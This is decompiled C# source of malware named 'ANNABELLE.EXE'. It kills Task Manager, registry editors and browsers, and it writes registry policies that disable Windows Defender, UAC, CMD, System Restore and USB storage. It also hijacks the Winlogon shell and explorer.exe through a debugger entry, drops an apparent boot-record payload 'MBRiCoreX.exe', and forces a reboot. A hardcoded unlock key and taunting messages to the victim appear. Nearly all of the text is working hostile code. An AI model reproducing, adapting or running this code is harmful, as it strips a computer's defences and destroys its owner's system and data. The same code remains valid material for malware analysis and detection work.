		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Invalid comparison between Unknown and I4
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d3: Invalid comparison between Unknown and I4
		if ((int)Form2.smethod_70(e) == 262259)
		{
			Form2.smethod_73(Form2.smethod_72(new string[7]
			{
				"Annabelle",
				Form2.smethod_71(),
				"Just",
				Form2.smethod_71(),
				"Wants",
				Form2.smethod_71(),
				"To"
			}), "Play", (MessageBoxButtons)0, (MessageBoxIcon)64);
			Form2.smethod_74(e, bool_0: true);
		}
		if ((int)Form2.smethod_70(e) == 35)
		{
			Form2.smethod_73(Form2.smethod_72(new string[7]
			{
				"Annabelle",
				Form2.smethod_71(),
				"Just",
				Form2.smethod_71(),
				"Wants",
				Form2.smethod_71(),
				"To"
			}), "Play", (MessageBoxButtons)0, (MessageBoxIcon)64);
			Form2.smethod_74(e, bool_0: true);
		}
		if ((int)Form2.smethod_70(e) != 13)
		{
		}
	}

	private void method_7(object sender, EventArgs e)
	{
		Form2.smethod_40((Control)(object)Class1.Class2_0.Form1_0);
		Form2.smethod_42(Label1, Form2.smethod_75(method_2()));
		Form2.smethod_59(Timer_0, 1000);
		Form2.smethod_39(Timer_0);
	}

	private void method_8(object sender, EventArgs e)
	{
		Form2.smethod_42(Label2, Form2.smethod_76(Form2.smethod_52(Form2.smethod_47(Label2)) - 1.0));
		if (Form2.smethod_77(Form2.smethod_47(Label2), "400", bool_0: false) == 0)
		{
			method_64();
			string string_ = "C:\\AfterMBR.txt";
			FileStream fileStream = Form2.smethod_63(string_);
			byte[] array = Form2.smethod_65((Encoding)Form2.smethod_64(bool_0: true), "Detect");
			Form2.smethod_66(fileStream, array, 0, array.Length);
			Form2.smethod_67((Stream)fileStream);
		}
		if (Form2.smethod_77(Form2.smethod_47(Label2), "0", bool_0: false) == 0)
		{
			Form2.smethod_58(Timer_0);
		}
		if (Form2.smethod_77(Form2.smethod_47(Label2), "0", bool_0: false) == 0)
		{
			string string_2 = Form2.smethod_80(Form2.smethod_79(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0)));
			string string_3 = Form2.smethod_41(string_2, "MBRiCoreX.exe");
			Form2.smethod_81(string_3, Class5.Byte_0);
			Form2.smethod_82(string_3);
		}
	}

	private void method_9(object sender, EventArgs e)
	{
		Form2.smethod_42(Label2, Form2.smethod_76(Form2.smethod_52(Form2.smethod_47(Label2)) - 1.0));
		if (Form2.smethod_77(Form2.smethod_47(Label2), "0", bool_0: false) == 0)
		{
			Form2.smethod_58(Timer_1);
		}
		if (Form2.smethod_77(Form2.smethod_47(Label2), "0", bool_0: false) == 0)
		{
			string string_ = Form2.smethod_80(Form2.smethod_79(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0)));
			string string_2 = Form2.smethod_41(string_, "MBRiCoreX.exe");
			Form2.smethod_81(string_2, Class5.Byte_0);
			Form2.smethod_82(string_2);
		}
	}

	private void method_10(object sender, EventArgs e)
	{
		Form2.smethod_83((Control)(object)ListBox1);
		try
		{
			IEnumerator<string> enumerator = default(IEnumerator<string>);
			try
			{
				enumerator = Form2.smethod_85(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), Form2.smethod_84(Form2.smethod_79(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0))), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator2 = default(IEnumerator<string>);
				while (Form2.smethod_90((IEnumerator)enumerator))
				{
					string current = enumerator.Current;
					try
					{
						enumerator2 = Form2.smethod_86(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), current).GetEnumerator();
						while (Form2.smethod_90((IEnumerator)enumerator2))
						{
							string current2 = enumerator2.Current;
							if (!Form2.smethod_87(current2, "desktop.ini"))
							{
								Form2.smethod_89(Form2.smethod_88(ListBox1), (object)current2);
							}
						}
					}
					finally
					{
						if (enumerator2 != null)
						{
							Form2.smethod_4((IDisposable)enumerator2);
						}
					}
				}
			}
			finally
			{
				if (enumerator != null)
				{
					Form2.smethod_4((IDisposable)enumerator);
				}
			}
		}
		catch (Exception exception_)
		{
			Form2.smethod_34(exception_);
			Form2.smethod_35();
		}
		try
		{
			IEnumerator<string> enumerator3 = default(IEnumerator<string>);
			try
			{
				enumerator3 = Form2.smethod_86(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), Form2.smethod_84(Form2.smethod_79(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0)))).GetEnumerator();
				while (Form2.smethod_90((IEnumerator)enumerator3))
				{
					string current3 = enumerator3.Current;
					if (!Form2.smethod_87(current3, "desktop.ini"))
					{
						Form2.smethod_89(Form2.smethod_88(ListBox1), (object)current3);
					}
				}
			}
			finally
			{
				if (enumerator3 != null)
				{
					Form2.smethod_4((IDisposable)enumerator3);
				}
			}
		}
		catch (Exception exception_2)
		{
			Form2.smethod_34(exception_2);
			Form2.smethod_35();
		}
		try
		{
			IEnumerator<string> enumerator4 = default(IEnumerator<string>);
			try
			{
				enumerator4 = Form2.smethod_85(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), Form2.smethod_91(Form2.smethod_79(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0))), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator5 = default(IEnumerator<string>);
				while (Form2.smethod_90((IEnumerator)enumerator4))
				{
					string current4 = enumerator4.Current;
					try
					{
						enumerator5 = Form2.smethod_86(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), current4).GetEnumerator();
						while (Form2.smethod_90((IEnumerator)enumerator5))
						{
							string current5 = enumerator5.Current;
							if (!Form2.smethod_87(current5, "desktop.ini"))
							{
								Form2.smethod_89(Form2.smethod_88(ListBox1), (object)current5);
							}
						}
					}
					finally
					{
						if (enumerator5 != null)
						{
							Form2.smethod_4((IDisposable)enumerator5);
						}
					}
				}
			}
			finally
			{
				if (enumerator4 != null)
				{
					Form2.smethod_4((IDisposable)enumerator4);
				}
			}
		}
		catch (Exception exception_3)
		{
			Form2.smethod_34(exception_3);
			Form2.smethod_35();
		}
		try
		{
			IEnumerator<string> enumerator6 = default(IEnumerator<string>);
			try
			{
				enumerator6 = Form2.smethod_86(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), Form2.smethod_91(Form2.smethod_79(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0)))).GetEnumerator();
				while (Form2.smethod_90((IEnumerator)enumerator6))
				{
					string current6 = enumerator6.Current;
					if (!Form2.smethod_87(current6, "desktop.ini"))
					{
						Form2.smethod_89(Form2.smethod_88(ListBox1), (object)current6);
					}
				}
			}
			finally
			{
				if (enumerator6 != null)
				{
					Form2.smethod_4((IDisposable)enumerator6);
				}
			}
		}
		catch (Exception exception_4)
		{
			Form2.smethod_34(exception_4);
			Form2.smethod_35();
		}
		try
		{
			IEnumerator<string> enumerator7 = default(IEnumerator<string>);
			try
			{
				enumerator7 = Form2.smethod_85(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), Form2.smethod_92(Form2.smethod_79(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0))), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator8 = default(IEnumerator<string>);
				while (Form2.smethod_90((IEnumerator)enumerator7))
				{
					string current7 = enumerator7.Current;
					try
					{
						enumerator8 = Form2.smethod_86(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), current7).GetEnumerator();
						while (Form2.smethod_90((IEnumerator)enumerator8))
						{
							string current8 = enumerator8.Current;
							if (!Form2.smethod_87(current8, "desktop.ini"))
							{
								Form2.smethod_89(Form2.smethod_88(ListBox1), (object)current8);
							}
						}
					}
					finally
					{
						if (enumerator8 != null)
						{
							Form2.smethod_4((IDisposable)enumerator8);
						}
					}
				}
			}
			finally
			{
				if (enumerator7 != null)
				{
					Form2.smethod_4((IDisposable)enumerator7);
				}
			}
		}
		catch (Exception exception_5)
		{
			Form2.smethod_34(exception_5);
			Form2.smethod_35();
		}
		try
		{
			IEnumerator<string> enumerator9 = default(IEnumerator<string>);
			try
			{
				enumerator9 = Form2.smethod_86(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), Form2.smethod_92(Form2.smethod_79(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0)))).GetEnumerator();
				while (Form2.smethod_90((IEnumerator)enumerator9))
				{
					string current9 = enumerator9.Current;
					if (!Form2.smethod_87(current9, "desktop.ini"))
					{
						Form2.smethod_89(Form2.smethod_88(ListBox1), (object)current9);
					}
				}
			}
			finally
			{
				if (enumerator9 != null)
				{
					Form2.smethod_4((IDisposable)enumerator9);
				}
			}
		}
		catch (Exception exception_6)
		{
			Form2.smethod_34(exception_6);
			Form2.smethod_35();
		}
		try
		{
			IEnumerator<string> enumerator10 = default(IEnumerator<string>);
			try
			{
				enumerator10 = Form2.smethod_85(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), Form2.smethod_94("C:\\Users\\", Form2.smethod_93(), "\\Downloads"), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator11 = default(IEnumerator<string>);
				while (Form2.smethod_90((IEnumerator)enumerator10))
				{
					string current10 = enumerator10.Current;
					try
					{
						enumerator11 = Form2.smethod_86(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), current10).GetEnumerator();
						while (Form2.smethod_90((IEnumerator)enumerator11))
						{
							string current11 = enumerator11.Current;
							if (!Form2.smethod_87(current11, "desktop.ini"))
							{
								Form2.smethod_89(Form2.smethod_88(ListBox1), (object)current11);
							}
						}
					}
					finally
					{
						if (enumerator11 != null)
						{
							Form2.smethod_4((IDisposable)enumerator11);
						}
					}
				}
			}
			finally
			{
				if (enumerator10 != null)
				{
					Form2.smethod_4((IDisposable)enumerator10);
				}
			}
		}
		catch (Exception exception_7)
		{
			Form2.smethod_34(exception_7);
			Form2.smethod_35();
		}
		try
		{
			IEnumerator<string> enumerator12 = default(IEnumerator<string>);
			try
			{
				enumerator12 = Form2.smethod_86(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), Form2.smethod_94("C:\\Users\\", Form2.smethod_93(), "\\Downloads")).GetEnumerator();
				while (Form2.smethod_90((IEnumerator)enumerator12))
				{
					string current12 = enumerator12.Current;
					if (!Form2.smethod_87(current12, "desktop.ini"))
					{
						Form2.smethod_89(Form2.smethod_88(ListBox1), (object)current12);
					}
				}
			}
			finally
			{
				if (enumerator12 != null)
				{
					Form2.smethod_4((IDisposable)enumerator12);
				}
			}
		}
		catch (Exception exception_8)
		{
			Form2.smethod_34(exception_8);
			Form2.smethod_35();
		}
		try
		{
			IEnumerator<string> enumerator13 = default(IEnumerator<string>);
			try
			{
				enumerator13 = Form2.smethod_85(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), Form2.smethod_94("C:\\Users\\", Form2.smethod_93(), "\\Desktop"), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator14 = default(IEnumerator<string>);
				while (Form2.smethod_90((IEnumerator)enumerator13))
				{
					string current13 = enumerator13.Current;
					try
					{
						enumerator14 = Form2.smethod_86(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), current13).GetEnumerator();
						while (Form2.smethod_90((IEnumerator)enumerator14))
						{
							string current14 = enumerator14.Current;
							if (!Form2.smethod_87(current14, "desktop.ini"))
							{
								Form2.smethod_89(Form2.smethod_88(ListBox1), (object)current14);
							}
						}
					}
					finally
					{
						if (enumerator14 != null)
						{
							Form2.smethod_4((IDisposable)enumerator14);
						}
					}
				}
			}
			finally
			{
				if (enumerator13 != null)
				{
					Form2.smethod_4((IDisposable)enumerator13);
				}
			}
		}
		catch (Exception exception_9)
		{
			Form2.smethod_34(exception_9);
			Form2.smethod_35();
		}
		try
		{
			IEnumerator<string> enumerator15 = default(IEnumerator<string>);
			try
			{
				enumerator15 = Form2.smethod_85(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), Form2.smethod_94("C:\\Users\\", Form2.smethod_93(), "\\Desktop"), (SearchOption)3, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator16 = default(IEnumerator<string>);
				while (Form2.smethod_90((IEnumerator)enumerator15))
				{
					string current15 = enumerator15.Current;
					try
					{
						enumerator16 = Form2.smethod_86(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), current15).GetEnumerator();
						while (Form2.smethod_90((IEnumerator)enumerator16))
						{
							string current16 = enumerator16.Current;
							if (!Form2.smethod_87(current16, "desktop.ini"))
							{
								Form2.smethod_89(Form2.smethod_88(ListBox1), (object)current16);
							}
						}
					}
					finally
					{
						if (enumerator16 != null)
						{
							Form2.smethod_4((IDisposable)enumerator16);
						}
					}
				}
			}
			finally
			{
				if (enumerator15 != null)
				{
					Form2.smethod_4((IDisposable)enumerator15);
				}
			}
		}
		catch (Exception exception_10)
		{
			Form2.smethod_34(exception_10);
			Form2.smethod_35();
		}
		try
		{
			IEnumerator<string> enumerator17 = default(IEnumerator<string>);
			try
			{
				enumerator17 = Form2.smethod_86(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), Form2.smethod_94("C:\\Users\\", Form2.smethod_93(), "\\Desktop")).GetEnumerator();
				while (Form2.smethod_90((IEnumerator)enumerator17))
				{
					string current17 = enumerator17.Current;
					if (!Form2.smethod_87(current17, "desktop.ini"))
					{
						Form2.smethod_89(Form2.smethod_88(ListBox1), (object)current17);
					}
				}
			}
			finally
			{
				if (enumerator17 != null)
				{
					Form2.smethod_4((IDisposable)enumerator17);
				}
			}
		}
		catch (Exception exception_11)
		{
			Form2.smethod_34(exception_11);
			Form2.smethod_35();
		}
		try
		{
			IEnumerator<string> enumerator18 = default(IEnumerator<string>);
			try
			{
				enumerator18 = Form2.smethod_85(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), "D:\\", (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator19 = default(IEnumerator<string>);
				while (Form2.smethod_90((IEnumerator)enumerator18))
				{
					string current18 = enumerator18.Current;
					try
					{
						enumerator19 = Form2.smethod_86(Form2.smethod_78((ServerComputer)(object)Class1.Class0_0), current18).GetEnumerator();
						while (Form2.smethod_90((IEnumerator)enumerator19))
						{
							string current19 = enumerator19.Current;
							if (!Form2.smethod_87(current19, "desktop.ini"))
							{
								Form2.smethod_89(Form2.smethod_88(ListBox1), (object)current19);
							}
						}
					}
					finally
					{
						if (enumerator19 != null)
						{
							Form2.smethod_4((IDisposable)enumerator19);
						}
					}
				}
			}
			finally
			{
				if (enumerator18 != null)
				{
					Form2.smethod_4((IDisposable)enumerator18);
				}
			}
		}
		catch (Exception exception_12)
		{
			Form2.smethod_34(exception_12);
			Form2.smethod_35();
		}
	}

	private void method_11(object sender, EventArgs e)
	{
		Form2.smethod_40((Control)(object)ListBox1);
	}

	private void method_12(object sender, EventArgs e)
	{
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		if (Form2.smethod_77(Form2.smethod_51(TextBox1), "wHYecVx64uX2zjVedeTeyRLN", bool_0: false) == 0)
		{
			Form2.smethod_83((Control)(object)Class1.Class2_0.Form3_0);
			Form2.smethod_95((Control)(object)this);
			Form2.smethod_38((Form)(object)this);
			return;
		}
		checked
		{
			int i = default(int);
			for (; i < 10; i++)
			{
				((Form)this).set_Location(new Point(Form2.smethod_96((Form)(object)this).X + 10, ((Form)this).get_Location().Y));
				Thread.Sleep(50);
				((Form)this).set_Location(new Point(((Form)this).get_Location().X - 10, ((Form)this).get_Location().Y));
				Thread.Sleep(50);
			}
			Interaction.MsgBox((object)"The Key is wrong!", (MsgBoxStyle)16, (object)"ANNABELLE.EXE");
			Interaction.MsgBox((object)"Its not time to go away, annabelle wants to play :)", (MsgBoxStyle)16, (object)"ANNABELLE.EXE");
		}
	}

	private void method_13(object sender, EventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		Form2.smethod_30((object)"Big thanks to 'Siam Alam' for tips :) and 'Elektro Berkay / rootabx' for ideas & other shit!", (MsgBoxStyle)64, (object)"ANNABELLE.EXE");
		Form2.smethod_83((Control)(object)Class1.Class2_0.Form4_0);
	}

	private void method_14(object sender, EventArgs e)
	{
		Process[] array = Form2.smethod_97("ProcessHacker");
		foreach (Process process_ in array)
		{
			Form2.smethod_98(process_);
		}
		Process[] array2 = Form2.smethod_97("procexp64");
		foreach (Process process_2 in array2)
		{
			Form2.smethod_98(process_2);
		}
		Process[] array3 = Form2.smethod_97("msconfig");
		foreach (Process process_3 in array3)
		{
			Form2.smethod_98(process_3);
		}
		Process[] array4 = Form2.smethod_97("taskmgr");
		foreach (Process process_4 in array4)
		{
			Form2.smethod_98(process_4);
		}
		Process[] array5 = Form2.smethod_97("chrome");
		foreach (Process process_5 in array5)
		{
			Form2.smethod_98(process_5);
		}
		Process[] array6 = Form2.smethod_97("firefox");
		foreach (Process process_6 in array6)
		{
			Form2.smethod_98(process_6);
		}
		Process[] array7 = Form2.smethod_97("regedit");
		foreach (Process process_7 in array7)
		{
			Form2.smethod_98(process_7);
		}
		Process[] array8 = Form2.smethod_97("opera");
		foreach (Process process_8 in array8)
		{
			Form2.smethod_98(process_8);
		}
		Process[] array9 = Form2.smethod_97("UserAccountControlSettings");
		foreach (Process process_9 in array9)
		{
			Form2.smethod_98(process_9);
		}
		Process[] array10 = Form2.smethod_97("yandex");
		foreach (Process process_10 in array10)
		{
			Form2.smethod_98(process_10);
		}
		Process[] array11 = Form2.smethod_97("microsoftedge");
		foreach (Process process_11 in array11)
		{
			Form2.smethod_98(process_11);
		}
		Process[] array12 = Form2.smethod_97("microsoftedgecp");
		foreach (Process process_12 in array12)
		{
			Form2.smethod_98(process_12);
		}
		Process[] array13 = Form2.smethod_97("iexplore");
		foreach (Process process_13 in array13)
		{
			Form2.smethod_98(process_13);
		}
	}

	private void method_15(object sender, EventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		Form2.smethod_30((object)"Are you good enough to kill me?", (MsgBoxStyle)16, (object)"ANNABELLE.EXE");
		Form2.smethod_30((object)"No you arent :D", (MsgBoxStyle)16, (object)"ANNABELLE.EXE");
		Form2.smethod_30((object)"Are you good enough to kill me?", (MsgBoxStyle)16, (object)"ANNABELLE.EXE");
		Form2.smethod_30((object)"No you arent :D", (MsgBoxStyle)16, (object)"ANNABELLE.EXE");
	}

	private void method_16(object sender, EventArgs e)
	{
		object object_ = Form2.smethod_100(Form2.smethod_99("WScript.Shell", ""));
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\DisableRoutinelyTakingAction", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\WindowsDefenderMAJ", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\WindowsDefenderMAJ", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Script Host\\Settings\\Enabled", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows Script Host\\Settings\\Enabled", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableSR", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableSR", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableConfig", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableConfig", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR", 4, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR", 4, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\DisableCMD", 2, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\System\\DisableCMD", 2, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\DisableCMD", 2, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\DisableCMD", 2, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System\\DisableCMD", 2, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\DisableCMD", 2, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\\Restrict_Run", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\\Restrict_Run", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService", 4, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService", 4, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services\\WdNisSvc", 3, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdNisSvc", 3, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services\\WinDefend", 3, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinDefend", 3, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoControlPanel", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\MinimalX", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoRun", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form2.smethod_101(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoRun", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		RegistryKey registryKey_ = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", bool_0: true);
		Form2.smethod_104(registryKey_, "Shell", (object)Form2.smethod_103());
		method_17();
		method_18();
		method_19();
		method_20();
		method_21();
		method_22();
		method_23();
		method_24();
		method_25();
		method_26();
		method_27();
		method_29();
		method_28();
		method_30();
		method_31();
		method_32();
		method_33();
		method_34();
		method_35();
		method_36();
		method_37();
		method_38();
		method_37();
		method_39();
		method_40();
		method_41();
		method_42();
		method_43();
		method_44();
		method_46();
		method_45();
		method_47();
		method_48();
		method_49();
		method_50();
		method_51();
		method_52();
		method_53();
		method_54();
		method_55();
		method_56();
		method_57();
		method_58();
		method_59();
		method_60();
		method_61();
		method_62();
		method_63();
		Form2.smethod_105("shutdown", "-r -t 00 -f");
	}

	public void method_17()
	{
		RegistryKey registryKey_ = Form2.smethod_106(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe", RegistryKeyPermissionCheck.Default);
		Form2.smethod_107(registryKey_);
		RegistryKey registryKey_2 = Form2.smethod_102(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe", bool_0: true);
		Form2.smethod_104(registryKey_2, "Debugger", (object)Form2.smethod_103());
	}

